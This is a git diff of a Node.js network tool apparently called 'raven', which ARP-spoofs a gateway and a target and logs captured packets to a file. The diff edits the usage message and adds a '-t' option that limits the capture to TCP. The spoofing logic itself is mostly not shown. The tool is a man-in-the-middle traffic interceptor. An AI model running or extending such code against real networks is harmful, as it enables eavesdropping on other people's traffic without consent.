@@ -6,8 +6,8 @@ const arpjs = require("arpjs");
 const fs = require("fs");
 //check for all args
 if(process.argv.length < 3 ){
-   console.log("raven\nversion 1\nusage flock <gateway> <target> ");
-   process.exit(1);
+  console.log("usage raven <gateway> <target>"); 
+  process.exit(1);
 }
 //check if user is root
 if(process.getuid() != 0 ){
@@ -23,7 +23,21 @@ function spoof(gateway,target){
 }
 
 let timeout = setTimeout(function(){spoof(process.argv[2],process.argv[3]);},10000);
-const pcapSession = new pcap.Session();
+//empty var to use as session
+var pcapSession;
+
+// if statement evaulates
+// need for filter when
+// program is run
+//
+
+if(process.argv.indexOf("-t") != -1){
+    pcapSession = new pcap.Session("",{
+        filter: 'ip proto \\tcp'
+    });
+}else{
+    pcapSession = new pcap.Session();
+}
 
 pcapSession.on('packet',function(rawPacket){
     var packets_file = fs.createWriteStream("packets.txt",defaults = {
